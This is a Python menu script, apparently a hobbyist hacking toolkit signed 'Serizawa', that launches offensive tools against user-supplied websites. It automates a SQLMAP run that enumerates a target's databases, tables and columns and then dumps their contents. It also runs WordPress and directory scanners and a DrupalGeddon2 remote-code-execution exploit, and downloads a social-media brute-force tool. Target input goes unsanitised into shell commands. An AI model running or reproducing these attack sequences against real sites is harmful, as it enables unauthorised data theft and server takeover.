from __future__ import print_function

import os
import time
import os as sistema
import sys
import requests
import json
import requests
import distutils.dir_util
import subprocess as subp
# Set color
R = '\033[31m'   # Red
N = '\033[1;37m' # White
G = '\033[32m'   # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' # Blue
C = '\033[36m'   # cyan




os.system("clear")
print (""+G+"")




print ("                     @@@@@@@@@@@@@@@@@@@@@@@@@ )    @@ ) ")
print ("                     @@@@@@@@@@@@@@@@@@@@@@@@@ )   @@@@ )")
print ("                     @@@@@@@@@@@@@@@@@@@@@@@@@ )  @@@@@@ )")
print ("                                   @@@@@@@@@@@ ) @@@@@@@@ )")
print ("                                 @@@@@@@@@@@@ ) @@@@@@@@@@ )")
print ("                                @@@@@@@@@@@ ) @@@@@@@@@@@@@@ )")
print ("                              $@@@@@$$$$$ )   @@@@@ )")
print ("                            @!!!@@@@@@@@ )    @@@@@ )")
print ("                          !!!!!!!@@!!@@ )     @@@@@ )")
print ("                         !!!!!!!!!@!!@  )      @@@@@ )")
print ("                      !!!!!!!!!!!!!  )          @@@@@ )   @@@@@@ )")
print ("                  !!!!!!!!!!!!!!!! )             @@@@@@@@@@@ )")
print ("                "+C+"!!!!!!!!!!!!!!!!!!!!!!!!!!! ) @@@@@@ )")
print ("                "+C+"!!!!!!!!!!!!!!!!!!!!!!!!!!! ) @@@@@ )")
print ("                "+C+".!.!..!.!.!.!.!.!.!.!.!.!.! ) @@@@ )")
print ("                "+C+"                               @@ )")
print ("                "+C+"                               @ )")
print (""+R+"")
print (""+G+"[ > ] "+C+"C0d3d by Serizawa - <<<666H05T_BL4CK>>>")
print (""+G+"[ > ] "+N+"Type "+R+"'help' "+N+"to show options")
localtime = time.asctime( time.localtime(time.time()) )
print (""+G+"[ > ] "+N+"Waktu lokal saat ini :", localtime)
print ("")

def help():
	print (""+N+"")
	print ("--- TOOL ------                                    ")
	print ( ""+C+"["+G+" 1"+C+" ] SQLMAP auto exploiter 	   ")
	print ( ""+C+"["+G+" 2"+C+" ] SocialBox                    ")
	print ( ""+C+"["+G+" 3"+C+" ] mpsyt                        ")
	print ( ""+C+"["+G+" 4"+C+" ] SVScanner                    ")
	print ( ""+C+"["+G+" 5"+C+" ] Wscan 					   ")
	print ( ""+C+"["+G+" 6"+C+" ] DirSearch                    ")
	print ( ""+C+"["+G+" 7"+C+" ] wphunter                     ")
	print ( ""+C+"["+G+" 8"+C+" ] DrupalGeddon2 Auto Exploiter ")
	print ( ""+C+"["+G+" 9"+C+" ] About ./Serizawa             ")
	main()

	# SQLMAP
def sqlmap2():
	print ("Starting Sqlmap......")
	time.sleep(1)
	print (""+G+"")
	print ("_____  ______                  ______ ______") 
	print ("|    | |     |  |       |\  /| |    | |    |") 
	print ("_____| |     |  |       | \/ | |____| |____|")
	print ("|      |   \ |  |       |    | |    | |")
	print ("|_____||____\|  |_____  |    | |    | |")
	print ("             \                ")
	time.sleep(1)
	url = input(""+N+"Website "+R+" => ")
	os.system("cd zonk; cd sqlmap; python2 sqlmap.py -u %s --dbs" % url)
	dbs = input(""+N+"Database "+R+"=> ")
	os.system("cd zonk; cd sqlmap; python2 sqlmap.py -u %s -D %s --tables" % (url, dbs))
	tables = input(""+N+"Tables "+R+"=> ")
	os.system("cd zonk; cd sqlmap; python2 sqlmap.py -u %s -D %s -T %s --column" % (url, dbs, tables))
	column = input(""+N+"column "+R+"=> ")
	os.system("cd zonk; cd sqlmap; python2 sqlmap.py -u %s -D %s -T %s -C %s --dump" % (url, dbs, tables, column))

def network():
	try:
		requests.get('http://www.google.com/', timeout = 1)
		print (B + '[+]' + R + ' Checking Internet Connection...' + R, end='')
		print (C + ' Working' + R + '\n')
	except requests.ConnectionError:
		print (R + '[!]' + B + ' You are Not Connected to the Internet...Quiting...' + R)
		exit()
network()

def main():
	r = input(""+N+"Choose ur number"+R+" > ")
	if r == "1":
		sqlmap2()
		main()


	elif r == "2":
		ds = input("Continue Downloading SocialBox?(y/n) > ")
		if ds == 'y':
			print ("Downloading SocialBox.......")
			os.system("git clone https://github.com/TunisianEagles/SocialBox.git")
			time.sleep(1)
			main()
		elif ds == 'exit':
			main()
		elif ds == 'n':
			print ("Download Aborted")
		else:
			print ("UNKOWN COMMAND")
	elif r == "help":
		help()
		main()
	elif r == "3":
		os.system("sudo apt-get install mpv; pip install youtube-dl")
		print (""+B+"["+R+"-"+B+"]""Installed, now you just type mpsyt, *jika tidak ada eror saat install")
	elif r == "4":
		print ("Starting SVScanner.... ")
		print ("Press Ctrl+C to Exit SVScanner")
		time.sleep(3)
		os.system("cd exploit;cd wp ;cd SVScanner ; php svscanner.php ")
		print (""+N+"Exiting SVScanner.....")
		time.sleep(1)
		main()

	elif r == '5':
		print ("Starting Wscan....")
		print ("_____               ______  ______ ______ _____  ___     _________ ")
		print ("     |            ||      ||     ||     ||     ||   |   | ")
		print ("     |            ||      | _____||     ||     ||   |   |")
		print ("     |            ||______||      |      |_____||   |   |")
		print ("     |     __     ||      ||  ____|      |     ||   |   |")
		print ("     |    |  |    ||      ||     ||     ||     ||   |   |")
		print ("     |____|  |____||      ||_____||_____||     ||   |___|  ")
		time.sleep(1)
		target = input("Enter Target "+N+"=> ")
		user = input(""+R+"enter number of user "+N+"=> ")
		print ("Type "+R+"'run'")
		wpscan = input(""+N+"=> ")
		if wpscan == 'run':
			os.system("cd exploit;cd wscan;python2 wpscanner.py -s %s -n %s" % (target, user))
			print (""+B+"["+R+"-"+B+"]"" DONE")
			main()			

	elif r =='6':
		print (""+C+"Starting DirSearch.....")
		print ("_______ ()  _______")
		print ("|      \ | |       |")
		print ("|       || |       |")
		print ("|       || |_______|")
		print ("|       || ||_______")
		print ("|       || |        |")
		print ("|______/ | |        |")
		time.sleep(1)
		target = input(""+R+"Masukan Target ("+R+"DIRSEARCH"+N+") "+N+"=> ")
		extensi = input(""+R+"Extension (php/asp) ("+R+"SQLMAP"+N+") "+N+" => ")
		print (""+R+"type "+N+"'run'")
		Dirsearch = input(""+N+"=> ")
		if Dirsearch == 'run':
			os.system("cd exploit;cd dirsearch; python3 dirsearch.py -u %s -e %s" % (target,extensi))
			main()

	elif r == '7':
		print (""+C+"Starting WPHunter.....")
		time.sleep(1)
		target = input(""+R+"Enter Target ("+R+"WPhunter"+N+") "+N+"=> ")
		os.system("cd zonk;cd wphunter; php wphunter.php https://%s" % (target))
		main()

	elif r == '8':
		print ("Starting DrupalRCE....")
		time.sleep(1)
		target = input("Enter Target ("+R+"SQLMAP"+N+") "+R+"=> ")
		os.system("cd zonk;cd Drupalgeddon2; ruby drupalgeddon2.rb http://%s" % (target))
		main()
	elif r == '9':
		print ("saya ganteng")





	elif r == "exit":
		print (""+B+"["+R+"-"+B+"]"+N+" G00D BY3 ^-^ ")
		time.sleep(1)
		sys.exit()

	elif r == "clear":
		os.system("clear")
		main()
	elif r == "ls":
		os.system("ls")
		main()
		
	else:
		print (""+B+"["+R+"!"+B+"]"+B+""+B+" Unkown Comand : "+R+"",r)
		print (""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter "+R+"'help'")
		main()

	

if __name__ == "__main__":
	main()
